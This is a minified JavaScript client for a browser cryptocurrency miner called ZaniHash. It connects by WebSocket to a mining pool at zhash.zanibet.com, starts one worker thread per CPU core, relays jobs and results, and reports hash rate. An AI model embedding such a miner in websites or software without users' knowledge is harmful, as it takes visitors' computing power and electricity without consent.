var zaniHashJS,ws,server="wss://zhash.zanibet.com:5141/",job=null,workers=[],enableStack=!1,receiveStack=[],sendStack=[],totalhashes=0,connected=0,reconnector=0,attempts=1,reportMod=10,throttleMiner=0,handshake=null;function addWorkers(e){if(-1==(logicalProcessors=e)){try{logicalProcessors=window.navigator.hardwareConcurrency}catch(e){logicalProcessors=4}0<logicalProcessors&&logicalProcessors<40||(logicalProcessors=4)}for(95==throttleMiner&&(logicalProcessors=1);0<logicalProcessors--;)addWorker()}var openWebSocket=function(){null!=ws&&ws.close(),(ws=new WebSocket(server)).onmessage=on_servermsg,ws.onerror=function(e){connected<2&&(connected=2),(job=null)!=zaniHashJS&&zaniHashJS.error(e)},ws.onclose=function(){connected<2&&(connected=2),(job=null)!=zaniHashJS&&zaniHashJS.close()},ws.onopen=function(){ws.send(JSON.stringify(handshake)),connected=attempts=1,null!=zaniHashJS&&zaniHashJS.open()}};function startZaniHash(e){stopZaniHash(),connected=0,handshake={identifier:"handshake",userid:e,version:5},addWorkers(-1),reconnector()}function stopZaniHash(){connected=3,null!=ws&&ws.close(),deleteAllWorkers(),job=null}function addWorker(){var e=new Worker("%devoliosMiner_domain%/worker.js");workers.push(e),e.onmessage=on_workermsg,setTimeout(function(){informWorker(e)},2e3)}function removeWorker(){workers.length<1||workers.shift().terminate()}function deleteAllWorkers(){for(i=0;i<workers.length;i++)workers[i].terminate();workers=[]}function informWorker(e){on_workermsg({data:"wakeup",target:e})}function on_servermsg(e){var o=JSON.parse(e.data);enableStack&&receiveStack.push(o),"job"==o.identifier&&(job=o)}function on_workermsg(e){null!=zaniHashJS&&totalhashes%reportMod==0&&setThrottleMiner(parseInt(zaniHashJS.getPower()));var o=e.target;if(1==connected){if("nothing"!=e.data&&"wakeup"!=e.data){var n=JSON.parse(e.data);ws.send(e.data),enableStack&&sendStack.push(n)}if(null!==job){var r={job:job,throttle:Math.max(0,Math.min(throttleMiner,100))};o.postMessage(r),"wakeup"!=e.data&&(totalhashes+=1,null!=zaniHashJS&&totalhashes%reportMod==0&&zaniHashJS.setHashRate(totalhashes))}else setTimeout(function(){informWorker(o)},2e3)}else setTimeout(function(){informWorker(o)},2e3)}function setThrottleMiner(e){throttleMiner=e}reconnector=function(){3!==connected&&(null==ws||0!==ws.readyState&&1!==ws.readyState)&&(attempts++,openWebSocket()),3!==connected&&setTimeout(reconnector,1e4*attempts)};
